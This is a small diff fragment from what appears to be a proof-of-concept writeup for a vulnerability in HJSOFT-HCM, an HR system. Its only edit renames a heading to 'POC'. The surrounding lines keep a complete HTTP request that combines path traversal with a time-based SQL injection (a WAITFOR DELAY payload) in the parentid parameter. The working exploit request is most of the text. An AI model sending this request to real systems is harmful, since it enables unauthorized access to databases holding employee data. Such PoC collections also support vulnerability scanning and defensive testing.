@@ -8,7 +8,7 @@
 app="HJSOFT-HCM"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /w_selfservice/oauthservlet/%2e./.%2e/common/org/loadtree?params=child&treetype=1&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&kind=2&issuperuser=1&manageprive=1&action=1&target=1&backdate=1&jump=1 HTTP/1.1
